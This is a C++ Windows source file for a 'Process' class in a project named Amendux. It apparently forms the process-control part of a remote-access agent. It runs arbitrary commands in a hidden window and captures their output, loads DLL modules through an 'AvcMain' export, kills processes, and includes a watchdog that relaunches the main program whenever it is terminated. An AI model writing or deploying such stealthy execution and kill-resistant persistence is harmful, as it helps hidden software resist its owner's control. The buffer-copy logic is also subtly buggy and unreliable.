#include "stdafx.h"
#include "Log.h"
#include "Config.h"
#include "Process.h"

using namespace Amendux;

bool Process::RunUpdateInstance(const std::wstring& file)
{
	std::wstring updateExe = L" /Nu " + std::to_wstring(Util::currentProcessId()) + L" 0x17";

	PROCESS_INFORMATION processInfo;
	STARTUPINFO startupInfo;
	::ZeroMemory(&startupInfo, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);

	if (::CreateProcess(file.c_str(), (LPTSTR)updateExe.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo)) {
		return true;
	}

	return false;
}


bool Process::KillProcess(unsigned int pid)
{
	HANDLE hProc = OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE, TRUE, pid);
	if (!hProc) {
		return false;
	}

	TerminateProcess(hProc, 0);

	return true;
}


bool TerminateAppEnum(HWND hwnd, LPARAM lParam)
{
	DWORD dwID;

	GetWindowThreadProcessId(hwnd, &dwID);

	if (dwID == (DWORD)lParam) {
		PostMessage(hwnd, WM_CLOSE, 0, 0);
	}

	return TRUE;
}


bool Process::EndProcess(unsigned int pid, DWORD dwTimeout)
{
	HANDLE hProc = OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE, FALSE, pid);
	if (!hProc) {
		return false;
	}

	// TerminateAppEnum() posts WM_CLOSE to all windows whose PID
	// matches your process's.
	EnumWindows((WNDENUMPROC)TerminateAppEnum, (LPARAM)pid);

	// Wait on the handle. If it signals, great. If it times out,
	// then you kill it.
	if (WaitForSingleObject(hProc, dwTimeout) != WAIT_OBJECT_0) {
		return false;
	}

	CloseHandle(hProc);

	return true;
}


bool Process::LoadModule(const std::wstring& module)
{
	bool bResult = false;
	typedef int (*DLLPROC)();

	HINSTANCE hInstDLL = LoadLibrary(module.c_str());
	if (hInstDLL) {
		DLLPROC fnRunMod = (DLLPROC)GetProcAddress(hInstDLL, "AvcMain");
		if (fnRunMod) {
			fnRunMod();

			bResult = true;
		}

		FreeLibrary(hInstDLL);
	}

	return bResult;
}


LPWSTR Process::Execute(LPWSTR command) {
	const size_t nAllocSize = sizeof(char) * 1024 * 1024; // 1Mb
	bool bExecuted = false;
	char *output = (char *)LocalAlloc(LPTR, nAllocSize);

	HANDLE readPipe, writePipe;
	SECURITY_ATTRIBUTES security;
	STARTUPINFOW start;
	PROCESS_INFORMATION processInfo;

	security.nLength = sizeof(SECURITY_ATTRIBUTES);
	security.bInheritHandle = true;
	security.lpSecurityDescriptor = NULL;

	if (CreatePipe(&readPipe, &writePipe, &security, 0)) {
		GetStartupInfo(&start);
		start.hStdOutput = writePipe;
		start.hStdError = writePipe;
		start.hStdInput = readPipe;
		start.dwFlags = STARTF_USESTDHANDLES + STARTF_USESHOWWINDOW;
		start.wShowWindow = SW_HIDE;

		if (CreateProcess(NULL, command, &security, &security, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &start, &processInfo)) {
			DWORD bytesRead = 0, count = 0;
			const int BUFF_SIZE = 1024;
			char *buffer = (char *)calloc(BUFF_SIZE + 1, sizeof(char));

			// wait for the child process to start
			for (UINT state = WAIT_TIMEOUT; state == WAIT_TIMEOUT; state = WaitForSingleObject(processInfo.hProcess, 100));

			do {
				DWORD dwAvail = 0;
				if (!PeekNamedPipe(readPipe, NULL, 0, NULL, &dwAvail, NULL)) {
					break;
				}

				if (!dwAvail) {
					break;
				}

				memset(buffer, 0, BUFF_SIZE + 1);
				ReadFile(readPipe, buffer, BUFF_SIZE, &bytesRead, NULL);
				buffer[BUFF_SIZE] = '\0';
				if ((count + bytesRead) > nAllocSize)
					break;

				memcpy(output + count, buffer, BUFF_SIZE);
				count += bytesRead;
			} while (bytesRead >= BUFF_SIZE);

			free(buffer);

			bExecuted = true;
		}

	}

	CloseHandle(processInfo.hThread);
	CloseHandle(processInfo.hProcess);
	CloseHandle(writePipe);
	CloseHandle(readPipe);

	if (!bExecuted) {
		return nullptr;
	}

	// Convert result buffer to a wide-character string
	LPWSTR result = Util::chartowchar(output);
	LocalFree(output);
	return result;
}


void Process::SpawnGuard()
{
	DWORD value = MAX_PATH;
	WCHAR buffer[MAX_PATH];

	if (!Config::Current()->CanGuardProcess()) {
		return;
	}

	Log::Info(L"Process", L"Start guarding main module");

	unsigned int pid = Config::Current()->GuardProcess();
	HANDLE hProc = OpenProcess(SYNCHRONIZE | PROCESS_QUERY_INFORMATION, FALSE, pid);
	if (!hProc) {
		Log::Error(L"Process", L"Cannot find process");
		return;
	}

	if (!QueryFullProcessImageName(hProc, 0, buffer, &value)) {
		Log::Error(L"Process", L"Cannot find process image");
		return;
	}

	if (WaitForSingleObject(hProc, INFINITE) == WAIT_OBJECT_0) {
		Log::Warn(L"Process", L"Main module terminated");
		
		Sleep(1000);

		PROCESS_INFORMATION processInfo;
		STARTUPINFO startupInfo;
		::ZeroMemory(&startupInfo, sizeof(startupInfo));
		startupInfo.cb = sizeof(startupInfo);

		if (::CreateProcess(buffer, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo)) {
			hProc = processInfo.hProcess;
			Log::Info(L"Process", L"Main module restarted");
		}

		PostQuitMessage(0);
	}

	CloseHandle(hProc);
}
